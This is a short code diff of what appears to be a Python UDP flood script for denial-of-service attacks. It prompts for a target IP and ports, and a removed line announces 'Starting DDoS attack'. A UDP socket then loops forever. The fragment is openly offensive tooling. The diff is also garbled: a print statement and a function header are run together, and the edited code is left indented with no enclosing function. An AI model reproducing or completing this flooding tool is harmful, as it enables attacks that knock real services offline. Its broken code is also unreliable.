@@ -6,9 +6,8 @@ import os
 import time
 
 target_ip = input("Enter target IP: ")
-target_ports = list(map(int, input("Enter ports to target, separated by commas (e.g., 80,443,25): ").split(',')))
-print("Starting DDoS attack on", target_ip,"with following ports:", target_ports)def udp_flood():    global packets_sent, attack_num
-    
+target_ports = list(map(int, input("Enter ports to target, separated by commas (e.g., 80,443,25): ").split(',')))  # Attack configuration
+
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)    
     while True:
         try:
